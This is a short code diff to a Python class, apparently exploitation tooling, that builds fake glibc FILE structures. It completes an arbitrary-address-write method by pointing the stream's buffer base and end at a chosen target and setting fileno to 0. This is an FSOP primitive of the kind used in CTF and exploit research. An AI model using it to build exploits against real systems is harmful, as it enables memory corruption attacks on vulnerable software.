@@ -16,5 +16,10 @@ class FILESTRUCTURE:
         return padding + bytes(self.FS)[:-8]
 
     def aaw(self, padding: bytes , flags: int , target_addr: int , size: int, lock_addr:int ):
+        self.FS.flags = flags
         self.FS._lock = lock_addr
+        self.FS._IO_buf_base = target_addr
+        self.FS._IO_buf_end = target_addr + size
         self.FS.fileno = 0
+	
+        return padding + bytes(self.FS)[:-8]
